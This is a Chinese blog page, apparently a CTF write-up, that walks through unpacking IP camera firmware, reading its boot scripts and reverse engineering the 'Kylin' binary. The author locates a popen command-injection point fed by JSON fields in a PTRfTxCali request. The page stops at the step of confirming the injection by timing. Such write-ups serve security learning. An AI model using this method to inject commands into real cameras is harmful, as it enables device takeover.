@@ -1,0 +1,755 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"澶嶅埗鎴愬姛(*^鈻絕*)","fail":"澶嶅埗澶辫触 (锞熲娍锞?锞?","copyright":{"enable":false,"count":100,"content":"鏈枃鐗堟潈锛氭湰鍗氬鎵€鏈夋枃绔犻櫎鐗瑰埆澹版槑澶栵紝鍧囬噰鐢?BY-NC-SA 璁稿彲鍗忚銆傝浆杞借娉ㄦ槑鍑哄锛?"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  
+  <title>
+    nepctf What&#39;s the IPC |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="nepctf-2026-What’s the IPC解包+固件分析题目的描述很简答, 就说是一个有漏洞的摄像头 附件是一个.bin固件, 用binwalk就能解开 1binwalk -Me firmware.bin  可以在 1_firmware.bin-0.extracted&#x2F;_romfs-x.squash.img.extracted&#x2F;squashfs-root  中找到文件系统 因为这里指明了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nepctf What&#39;s the IPC">
+<meta property="og:url" content="https://khighl.github.io.git/2026/08/21/nepctf_iot/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="nepctf-2026-What’s the IPC解包+固件分析题目的描述很简答, 就说是一个有漏洞的摄像头 附件是一个.bin固件, 用binwalk就能解开 1binwalk -Me firmware.bin  可以在 1_firmware.bin-0.extracted&#x2F;_romfs-x.squash.img.extracted&#x2F;squashfs-root  中找到文件系统 因为这里指明了">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-21T02:06:46.131Z">
+<meta property="article:author" content="zer00ne">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">灏戝コ绁堢シ涓?..</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="nepctf What&#39;s the IPC">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">nepctf What&#39;s the IPC</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#nepctf-2026-What%E2%80%99s-the-IPC"><span class="toc-number">1.</span> <span class="toc-text">nepctf-2026-What’s the IPC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%8C%85-%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">解包+固件分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">逆向分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99"><span class="toc-number">1.3.</span> <span class="toc-text">脚本编写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.1.</span> <span class="toc-text">测信道攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.3.2.</span> <span class="toc-text">文件重定向</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">26</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-nepctf_iot" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-08-20T16:00:00.000Z" itemprop="datePublished">2026-08-21</time>
+    <time style="display: none;" id="post-update-time">2026-08-21</time>
+  </span>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctf-iot/" data-aos="zoom-in">ctf iot</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="nepctf-2026-What’s-the-IPC"><a href="#nepctf-2026-What’s-the-IPC" class="headerlink" title="nepctf-2026-What’s the IPC"></a>nepctf-2026-What’s the IPC</h1><h2 id="解包-固件分析"><a href="#解包-固件分析" class="headerlink" title="解包+固件分析"></a>解包+固件分析</h2><p>题目的描述很简答, 就说是一个有漏洞的摄像头</p>
+<p>附件是一个.bin固件, 用binwalk就能解开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me firmware.bin</span><br></pre></td></tr></table></figure>
+
+<p>可以在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_firmware.bin-0.extracted/_romfs-x.squash.img.extracted/squashfs-root</span><br></pre></td></tr></table></figure>
+
+<p>中找到文件系统</p>
+<p>因为这里指明了是摄像头, 所以可以快速去找<code>Kylin</code>文件</p>
+<p>最终在<code>./_user-x.squash.img.extracted/squashfs-root/bin/Kylin</code>中找到了 , 这个文件大概就是需要逆向分析的elf</p>
+<p>当然也可以从启动脚本中寻找</p>
+<p>前往文件系统中的&#x2F;etc&#x2F;init.d&#x2F;下的rcS中看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">hostname ni</span><br><span class="line">mount -a</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">if [ ! -e &quot;/dev/ptmx&quot; ]; then</span><br><span class="line">	mknod -m 666 /dev/ptmx c 5 24</span><br><span class="line">fi</span><br><span class="line">echo /sbin/mdev &gt; /proc/sys/kernel/hotplug</span><br><span class="line">mdev -s</span><br><span class="line"></span><br><span class="line">mount -t squashfs /dev/mtdblock4 /opt/app</span><br><span class="line">mount -t squashfs /dev/mtdblock5 /opt/web</span><br><span class="line">mount -t squashfs /dev/mtdblock6 /opt/custom</span><br><span class="line">mount -t jffs2 /dev/mtdblock7 /opt/sav -o sync</span><br><span class="line"></span><br><span class="line">if [ -f /opt/sav/S99.sh ]; then</span><br><span class="line">	sh /opt/sav/S99.sh</span><br><span class="line">	exit </span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">for initscript in /etc/init.d/S[0-9][0-9]*</span><br><span class="line">do</span><br><span class="line">    if [ -x $initscript ] ;</span><br><span class="line">    then</span><br><span class="line">        echo &quot;[RCS]: $initscript&quot;</span><br><span class="line">        $initscript</span><br><span class="line">    fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>调用了S99.sh , 这个文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">#load ko</span><br><span class="line">cp /opt/app/ko.tar.xz  /var -rf</span><br><span class="line">cd /var</span><br><span class="line">xz -d /var/ko.tar.xz</span><br><span class="line">tar -xvf /var/ko.tar</span><br><span class="line">cd ko;sh load520_mdk_asic -i --sensor0 os04d10;cd -</span><br><span class="line"></span><br><span class="line">ifconfig lo 127.0.0.1</span><br><span class="line">ifconfig eth0 192.168.1.203</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if [ -f /opt/app/appconfig.tar.xz ]; then</span><br><span class="line">	cp /opt/app/appconfig.tar.xz  /var -rf</span><br><span class="line">	cd /var</span><br><span class="line">	xz -d /var/appconfig.tar.xz</span><br><span class="line">	tar -xf /var/appconfig.tar</span><br><span class="line">	rm /var/appconfig.tar</span><br><span class="line">	/var/system/auto-appconfig-select.sh</span><br><span class="line">	rm /var/system -r</span><br><span class="line">else </span><br><span class="line">	/opt/app/system/auto-appconfig-select.sh</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># decompress font.tar.xz</span><br><span class="line">if [ -f /opt/app/font.tar.xz ]; then</span><br><span class="line">	cp /opt/app/font.tar.xz  /var -rf</span><br><span class="line">	cd /var</span><br><span class="line">	xz -d /var/font.tar.xz</span><br><span class="line">	tar -xf /var/font.tar</span><br><span class="line">	rm /var/font.tar</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># decompress gui.tar.xz</span><br><span class="line">if [ -f /opt/app/gui.tar.xz ]; then</span><br><span class="line">	cp /opt/app/gui.tar.xz  /var -rf</span><br><span class="line">	cd /var</span><br><span class="line">	xz -d /var/gui.tar.xz</span><br><span class="line">	tar -xf /var/gui.tar</span><br><span class="line">	rm /var/gui.tar</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># decompress model.tar.xz</span><br><span class="line">if [ -f /opt/app/model.tar.xz ]; then</span><br><span class="line">	cp /opt/app/model.tar.xz  /var -rf</span><br><span class="line">	cd /var</span><br><span class="line">	xz -d /var/model.tar.xz</span><br><span class="line">	tar -xf /var/model.tar</span><br><span class="line">	rm /var/model.tar</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">xuart=`awk &#x27;/^(xuart)/&#123; print $2 &#125;&#x27; /proc/vss/bootpara`</span><br><span class="line">if [ $xuart == &#x27;1&#x27; ];then</span><br><span class="line">	mac=`ifconfig eth0|awk &#x27;/(HWaddr)/&#123;print $5&#125;&#x27; | tr &#x27;:&#x27; &#x27;-&#x27;`</span><br><span class="line">	ip=`cat /opt/sav/Config/network | grep HOSTIP | awk &#x27;/(HOSTIP)/&#123;print $3&#125;&#x27;`</span><br><span class="line">	echo &quot;/mnt/debug/IPC/coredump.$mac.$ip.%e.%p.%t&quot; &gt; /proc/sys/kernel/core_pattern</span><br><span class="line">	ulimit -c unlimited</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># rm /opt/sav/Config/passwd*</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">#release mem</span><br><span class="line">rm -rf /var/ko.tar</span><br><span class="line">rm -rf /var/ko</span><br><span class="line">sync</span><br><span class="line">echo 3 &gt; /proc/sys/vm/drop_caches</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">xapp=`awk &#x27;/^(xapp)/&#123; print $2 &#125;&#x27; /proc/vss/bootpara`</span><br><span class="line">if [ $xapp == &#x27;1&#x27; ];then</span><br><span class="line">	/opt/app/bin/Kylin</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<p>可以看到倒数第二行, 就是启动Kylin作为服务</p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>使用IDA打开Kylin可以看到这是一个超级大的文件 , 如果漏洞点是在某个地方埋了一个栈溢出, 可能性不大</p>
+<p>所以优先从命令执行方面看</p>
+<p>对着system和popen搜索发现 , 发现system的参数不太可能被控制 </p>
+<p>但是在popen中找到了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall sub_7D98C(int dest, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // r4</span><br><span class="line">  FILE *stream_1; // r0</span><br><span class="line">  const char *v6; // r1</span><br><span class="line">  FILE *stream; // r6</span><br><span class="line"></span><br><span class="line">  v4 = 0;</span><br><span class="line">  while ( v4 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    stream_1 = popen((const char *)(dest + (v4 &lt;&lt; 6)), &quot;r&quot;);</span><br><span class="line">    v6 = (const char *)(dest + (v4 &lt;&lt; 6));</span><br><span class="line">    stream = stream_1;</span><br><span class="line">    if ( !stream_1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Error, Execute %s failed!\n&quot;, v6);</span><br><span class="line">      return -1;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v4;</span><br><span class="line">    printf(&quot;ATE_ControlPkt cmd %s\n&quot;, v6);</span><br><span class="line">    pclose(stream);</span><br><span class="line">    usleep((__useconds_t)&quot;11char_traitsIcEEE&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大概可以看到这是一个<strong>命令列表</strong>进行执行, 每条命令最长为64字节</p>
+<p>对其交叉引用的第一个结果便很有价值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">  v51 = sub_171858(v584, &quot;method&quot;);</span><br><span class="line">  sub_170080(v709, v51);</span><br><span class="line">  v52 = sub_73840(v709, &quot;PTRfTxCali&quot;);</span><br><span class="line">  sub_4A0D00(v709);</span><br><span class="line">  if ( v52 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( sub_170EEA() )</span><br><span class="line">    &#123;</span><br><span class="line">      strcpy((char *)dest, &quot;rtwpriv wlan0 mp_ctx stop&quot;);</span><br><span class="line">      sub_171858(v584, &quot;param&quot;);</span><br><span class="line">      if ( sub_170EEA() )</span><br><span class="line">      &#123;</span><br><span class="line">        v55 = sub_171858(v584, &quot;param&quot;);</span><br><span class="line">        v56 = (const char *)sub_171858(v55, &quot;mp_phypara&quot;);</span><br><span class="line">        v60 = sub_170746(v56, v57, v58, v59);</span><br><span class="line">        n2 = 2;</span><br><span class="line">        snprintf((char *)&amp;dest[16], 0x240u, &quot;rtwpriv wlan0 mp_phypara %s&quot;, v60);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        n2 = 1;</span><br><span class="line">      &#125;</span><br><span class="line">      sub_171858(v584, &quot;param&quot;);</span><br><span class="line">      if ( sub_170EEA() )</span><br><span class="line">      &#123;</span><br><span class="line">        v63 = sub_171858(v584, &quot;param&quot;);</span><br><span class="line">        v64 = (const char *)sub_171858(v63, &quot;mp_rate&quot;);</span><br><span class="line">        v68 = sub_170746(v64, v65, v66, v67);</span><br><span class="line">        snprintf((char *)&amp;dest[16 * n2++], 0x240u, &quot;rtwpriv wlan0 mp_rate %s&quot;, v68);</span><br><span class="line">      &#125;</span><br><span class="line">      v69 = n2 + 1;</span><br><span class="line">      strcpy((char *)&amp;dest[16 * n2], &quot;rtwpriv wlan0 mp_reset_stats&quot;);</span><br><span class="line">      sub_171858(v584, &quot;param&quot;);</span><br><span class="line">      if ( sub_170EEA() )</span><br><span class="line">      &#123;</span><br><span class="line">        v69 = n2 + 2;</span><br><span class="line">        v70 = sub_171858(v584, &quot;param&quot;);</span><br><span class="line">        v71 = (const char *)sub_171858(v70, &quot;mp_bandwidth&quot;);</span><br><span class="line">        v75 = sub_170746(v71, v72, v73, v74);</span><br><span class="line">        snprintf((char *)&amp;dest[16 * n2 + 16], 0x240u, &quot;rtwpriv wlan0 mp_bandwidth %s&quot;, v75);</span><br><span class="line">      &#125;</span><br><span class="line">      sub_171858(v584, &quot;param&quot;);</span><br><span class="line">      if ( sub_170EEA() )</span><br><span class="line">      &#123;</span><br><span class="line">        v76 = sub_171858(v584, &quot;param&quot;);</span><br><span class="line">        v77 = (const char *)sub_171858(v76, &quot;mp_channel&quot;);</span><br><span class="line">        v81 = sub_170746(v77, v78, v79, v80);</span><br><span class="line">        snprintf((char *)&amp;dest[16 * v69++], 0x240u, &quot;rtwpriv wlan0 mp_channel %s&quot;, v81);</span><br><span class="line">      &#125;</span><br><span class="line">      sub_171858(v584, &quot;param&quot;);</span><br><span class="line">      if ( sub_170EEA() )</span><br><span class="line">      &#123;</span><br><span class="line">        v82 = sub_171858(v584, &quot;param&quot;);</span><br><span class="line">        v83 = (const char *)sub_171858(v82, &quot;mp_txpower&quot;);</span><br><span class="line">        v87 = sub_170746(v83, v84, v85, v86);</span><br><span class="line">        snprintf((char *)&amp;dest[16 * v69++], 0x240u, &quot;rtwpriv wlan0 mp_txpower %s&quot;, v87);</span><br><span class="line">      &#125;</span><br><span class="line">      sub_171858(v584, &quot;param&quot;);</span><br><span class="line">      if ( sub_170EEA() )</span><br><span class="line">      &#123;</span><br><span class="line">        v88 = sub_171858(v584, &quot;param&quot;);</span><br><span class="line">        v89 = (const char *)sub_171858(v88, &quot;mp_ant_tx&quot;);</span><br><span class="line">        v93 = sub_170746(v89, v90, v91, v92);</span><br><span class="line">        snprintf((char *)&amp;dest[16 * v69++], 0x240u, &quot;rtwpriv wlan0 mp_ant_tx %s&quot;, v93);</span><br><span class="line">      &#125;</span><br><span class="line">      strcpy((char *)&amp;dest[16 * v69], &quot;rtwpriv wlan0 mp_ctx background,pkt&quot;);</span><br><span class="line">      if ( sub_7D98C((int)dest, v69 + 1) )</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>大概可以看到这是一个PTRfTxCali接口, 从报文中取出了各种字段, 和固有字符串拼接成为命令, 然后填入命令列表中</p>
+<p>最后被sub_7D98C调用popen执行, 至此大概可以确定攻击向量 : 从mp_phypara或mp_rate字段进行注入</p>
+<h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>可以把这个函数sub_7FCBC扔给AI, 大概率能跑出来报文的格式, 应该是如下的json</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;method&quot;: &quot;PTRfTxCali&quot;,</span><br><span class="line">  &quot;param&quot;: &#123;</span><br><span class="line">    &quot;mp_phypara&quot;: &quot;phpara&quot;,</span><br><span class="line">    &quot;mp_rate&quot;: &quot;rate&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为这个文件的响应报文是硬编码, 所以先通过时间注入判断命令注入的存在</p>
